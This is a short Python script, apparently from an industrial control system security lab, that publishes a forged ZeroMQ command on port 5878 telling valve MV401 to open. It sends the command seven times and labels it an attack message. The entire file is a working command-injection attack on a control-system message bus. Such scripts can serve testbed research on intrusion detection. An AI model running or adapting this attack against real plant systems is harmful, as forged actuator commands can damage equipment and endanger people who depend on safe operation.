import zmq
import time
context = zmq.Context()
socket = context.socket(zmq.PUB)
socket.bind("tcp://*:5878")  


if __name__ == "__main__":
    count=0
    while True:
        count+=1
        attack_message_1 = {
            'type':'valve',
                'component':'MV401',
                'command':'open'
        }
        socket.send_json(attack_message_1)
        print("Attack messages sent successfully!")
        if(count==7):
            break
        time.sleep(1)